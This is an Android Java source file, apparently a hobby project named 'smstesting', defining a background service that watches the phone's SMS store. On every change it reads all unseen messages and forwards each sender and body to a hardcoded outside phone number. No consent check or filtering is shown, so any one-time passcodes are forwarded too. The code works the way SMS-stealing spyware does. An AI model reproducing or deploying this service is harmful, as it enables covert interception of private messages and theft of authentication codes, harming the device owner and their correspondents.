package com.abhi.smstesting;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.widget.Toast;

import java.util.HashSet;
import java.util.Set;

public class SmsMonitorService extends Service {

    private SmsContentObserver smsContentObserver;

    private Set<String> fetchedMessageIds = new HashSet<>();

    @Override
    public void onCreate() {
        super.onCreate();
        smsContentObserver = new SmsContentObserver(new Handler());
        getContentResolver().registerContentObserver(
                Uri.parse("content://sms"), true, smsContentObserver);
        Toast.makeText(this, "SMS monitor service started", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        getContentResolver().unregisterContentObserver(smsContentObserver);
        Toast.makeText(this, "SMS monitor service stopped", Toast.LENGTH_SHORT).show();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private class SmsContentObserver extends ContentObserver {

        public SmsContentObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);
            // Handle SMS change here
            // For now, let's just display a toast
            Toast.makeText(SmsMonitorService.this, "New SMS received", Toast.LENGTH_SHORT).show();

            // Read and forward new SMS messages
            readAndForwardSms();
        }
    }

    private void readAndForwardSms() {
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null,
                null,
                null,
                Telephony.Sms.DEFAULT_SORT_ORDER); // Fetch SMS messages in chronological order

        if (cursor != null && cursor.moveToFirst()) {
            do {
                String messageId = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID));
                // Check if message ID is already fetched
                if (!fetchedMessageIds.contains(messageId)) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    forwardSms(address, body);
                    fetchedMessageIds.add(messageId); // Add message ID to the set

                    // Store the sent message ID to persistent storage
                    saveSentMessageId(messageId);
                }
            } while (cursor.moveToNext());
        }

        if (cursor != null) {
            cursor.close();
        }
    }

    private void forwardSms(String sender, String message) {
        // Replace "destinationNumber" with the number you want to forward the SMS to
        String destinationNumber = "+919876543210";

        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(destinationNumber, null, "Sender: " + sender + "\nMessage: " + message, null, null);
            Toast.makeText(this, "SMS forwarded successfully", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Failed to forward SMS: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            e.printStackTrace();
        }
    }

    // Method to save the sent message ID to SharedPreferences
    private void saveSentMessageId(String messageId) {
        // Use SharedPreferences to store the sent message IDs
        SharedPreferences sharedPreferences = getSharedPreferences("SentMessages", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putBoolean(messageId, true); // Store the message ID as a boolean flag
        editor.apply();
    }

}
